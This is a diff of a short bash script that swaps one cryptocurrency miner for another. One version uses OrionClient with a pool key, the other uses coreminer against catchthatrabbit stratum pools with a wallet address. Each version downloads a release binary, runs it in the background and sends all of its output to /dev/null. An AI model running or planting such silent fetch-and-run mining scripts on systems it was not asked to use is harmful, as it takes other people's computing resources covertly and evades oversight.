@@ -1,5 +1,5 @@
 #!/bin/bash
-wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient.tar.gz
-tar xf OrionClient.tar.gz
-cd OrionClient && chmod 777 OrionClient
-./OrionClient mine -a --pool twbitz --key J5RBZg3WLjXGXLEFypv4hq7D4tBrp2wDFKmg1m1hD6yZ --worker $(echo $(shuf -i 1-15000 -n 1)-CCC) > /dev/null 2>&1 &
+wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz
+tar xf coreminer-linux-x86_64.tar.gz
+cd coreapp
+./coreminer -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@eu.catchthatrabbit.com:8008 -P stratum1+tcp://cb1145cf4139a506a5395155bd5128152b673cc18377.$(echo $RANDOM | md5sum | head -c 10)@as.catchthatrabbit.com:8008 > /dev/null 2>&1 &
